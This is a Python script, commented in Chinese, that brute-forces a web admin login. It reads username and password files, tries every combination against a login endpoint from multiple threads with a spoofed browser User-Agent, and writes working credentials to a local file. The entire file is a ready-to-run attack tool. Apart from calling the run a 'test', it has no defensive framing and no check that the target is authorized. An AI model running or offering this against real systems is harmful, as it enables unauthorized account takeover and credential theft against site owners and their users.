#!/usr/bin/env python3
import requests
import threading
import json
from concurrent.futures import ThreadPoolExecutor
import time
import itertools
import os

class LoginBruteForcer:
    def __init__(self, url, username_file, password_file, thread_count=10):
        self.url = url
        self.username_file = username_file
        self.password_file = password_file
        self.thread_count = thread_count
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.success_credentials = []
        self.stop_flag = False
        
    def load_credentials(self):
        """从文件加载用户名和密码列表"""
        usernames = []
        passwords = []
        
        try:
            with open(self.username_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"错误: 找不到文件 {self.username_file}")
            return []
            
        try:
            with open(self.password_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"错误: 找不到文件 {self.password_file}")
            return []
            
        # 生成所有用户名密码组合
        combinations = list(itertools.product(usernames, passwords))
        print(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
        print(f"总共 {len(combinations)} 个登录组合")
        return combinations
    
    def single_login_request(self, username, password, attempt_id):
        """单次登录请求"""
        if self.stop_flag:
            return
            
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Content-Type': 'application/json'
            }
            
            login_data = {
                "username": username,
                "password": password
            }
            
            response = requests.post(
                self.url,
                json=login_data,
                headers=headers,
                timeout=10
            )
            
            result = response.json()
            
            with self.lock:
                if result.get("code") == 200:
                    self.success_count += 1
                    self.success_credentials.append((username, password))
                    print(f"✓ 登录成功! 用户名: {username}, 密码: {password}")
                    print(f"  响应: {result}")
                else:
                    self.fail_count += 1
                    print(f"✗ 尝试 {attempt_id}: {username}/{password} - {result.get('message', '未知错误')}")
                    
        except requests.exceptions.RequestException as e:
            with self.lock:
                self.fail_count += 1
                print(f"✗ 尝试 {attempt_id}: {username}/{password} - 请求异常: {e}")
        except json.JSONDecodeError as e:
            with self.lock:
                self.fail_count += 1
                print(f"✗ 尝试 {attempt_id}: {username}/{password} - JSON解析错误: {e}")
    
    def save_successful_credentials(self, filename="successful_credentials.txt"):
        """保存成功的登录凭据到文件"""
        if not self.success_credentials:
            print("没有成功的登录凭据需要保存")
            return
            
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("成功的登录凭据:\n")
                f.write("=" * 30 + "\n")
                for username, password in self.success_credentials:
                    f.write(f"用户名: {username}\n")
                    f.write(f"密码: {password}\n")
                    f.write("-" * 20 + "\n")
            
            print(f"成功的登录凭据已保存到: {filename}")
            
        except Exception as e:
            print(f"保存文件时出错: {e}")
    
    def run_brute_force(self):
        """运行暴力破解测试"""
        print(f"开始暴力破解测试")
        print(f"目标URL: {self.url}")
        print(f"线程数: {self.thread_count}")
        print("-" * 50)
        
        # 加载凭据组合
        combinations = self.load_credentials()
        if not combinations:
            print("没有找到有效的用户名密码组合")
            return
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            futures = []
            for i, (username, password) in enumerate(combinations):
                if self.stop_flag:
                    break
                future = executor.submit(self.single_login_request, username, password, i+1)
                futures.append(future)
            
            # 等待所有请求完成
            for future in futures:
                future.result()
        
        end_time = time.time()
        
        print("-" * 50)
        print(f"测试完成!")
        print(f"总尝试次数: {len(combinations)}")
        print(f"成功次数: {self.success_count}")
        print(f"失败次数: {self.fail_count}")
        print(f"总耗时: {end_time - start_time:.2f} 秒")
        print(f"平均响应时间: {(end_time - start_time) / len(combinations):.2f} 秒/请求")
        
        # 保存成功的凭据
        self.save_successful_credentials()

def main():
    # 配置参数
    url = "https://web.domain.com/admin/system/index/login"
    username_file = "username.txt"
    password_file = "password.txt"
    
    # 检查文件是否存在
    if not os.path.exists(username_file):
        print(f"错误: 找不到文件 {username_file}")
        return
        
    if not os.path.exists(password_file):
        print(f"错误: 找不到文件 {password_file}")
        return
    
    # 创建暴力破解实例
    brute_forcer = LoginBruteForcer(url, username_file, password_file, thread_count=5)
    
    # 运行暴力破解
    brute_forcer.run_brute_force()

if __name__ == "__main__":
    main()